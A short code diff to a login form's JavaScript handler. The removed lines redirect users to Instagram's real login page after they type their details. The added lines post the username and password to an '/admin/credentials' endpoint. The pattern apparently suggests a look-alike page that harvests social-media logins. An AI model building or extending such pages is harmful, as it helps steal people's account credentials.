@@ -1,11 +1,26 @@
 
-document.getElementById('loginForm').addEventListener('submit', function(e) {
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
   e.preventDefault();
   const inputs = this.querySelectorAll('input');
   const username = inputs[0].value;
   const password = inputs[1].value;
   
-  if (username && password) {
-    window.location.href = 'https://www.instagram.com/accounts/login/';
+  try {
+    const response = await fetch('/admin/credentials', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ username, password })
+    });
+    
+    if (response.ok) {
+      window.location.href = '/admin/dashboard';
+    } else {
+      alert('Login failed');
+    }
+  } catch (error) {
+    console.error('Error:', error);
+    alert('An error occurred');
   }
 });
